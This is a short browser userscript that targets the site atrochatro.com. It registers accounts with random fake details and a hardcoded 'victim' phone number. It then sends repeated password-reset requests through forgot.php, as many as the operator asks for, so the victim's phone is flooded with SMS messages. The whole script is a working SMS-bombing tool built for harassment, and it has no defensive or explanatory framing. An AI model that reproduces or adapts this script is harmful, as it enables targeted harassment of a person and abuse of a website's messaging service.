// ==UserScript==
// @name           atrochatro
// @namespace      nandu 
// @include        http://*atrochatro.com/*
// ==/UserScript==


var name='';
var victim= "9098789789";

if(document.location=="http://www.atrochatro.com/register.php")
{
var chars = "abcdefghiklmnopqrstuvwxyz";
for (var i=0; i<10; i++) 
{
var rnum = Math.floor(Math.random() * chars.length);
name += chars.substring(rnum,rnum+1);
}
document.forms[2].elements[0].value=name;
document.forms[2].elements[2].value=name;
document.forms[2].elements[3].value=name;
document.forms[2].elements[1].value='sdsa'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.forms[2].elements[4].value=Math.floor(Math.random()*29);
document.forms[2].elements[5].value=Math.floor(Math.random()*11);
document.forms[2].elements[6].value="198"+Math.floor(Math.random()*8);
document.forms[2].elements[7].checked=true;
document.forms[2].elements[9].value="India";
document.forms[2].elements[10].value='5';
document.forms[2].elements[11].value='Chandigarh';
document.forms[2].elements[12].checked=true;
document.forms[2].elements[13].value=victim;
document.forms[2].elements[14].checked=true;16
document.forms[2].elements[16].click();
document.forms[2].elements[16].click();
}

function sendSMS(no, n) {
    with(x = new XMLHttpRequest()) open("POST", "forgot.php", false), setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), send("submit=true&option=mobile&term=" + no);
	return x.responseText;
}


if(document.location=="http://www.atrochatro.com/forgot.php")
{
document.forms[0].elements[2].checked=true;
document.forms[0].elements[3].value=victim;
void(0);
var reply= prompt("enter the number of messages you want to send", "")

for(i=1;i<reply;i++)
sendSMS(victim, reply);

}